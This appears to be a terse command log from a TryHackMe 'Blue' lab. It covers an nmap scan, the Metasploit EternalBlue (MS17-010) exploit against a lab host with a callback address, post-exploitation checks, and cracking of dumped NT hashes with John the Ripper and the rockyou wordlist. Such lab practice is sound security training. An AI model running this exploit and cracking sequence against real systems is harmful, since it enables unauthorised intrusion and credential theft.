sudo nmap -Pn -sV -sC 10.65.163.160 -oN ~/THM/Blue/scans/nmap_initial.nmap
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.65.163.160
set LHOST 192.168.225.140
set VERIFY_ARCH true
set VERIFY_TARGET true
run
sysinfo
getuid
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt ~/THM/Blue/loot/hashes.txt
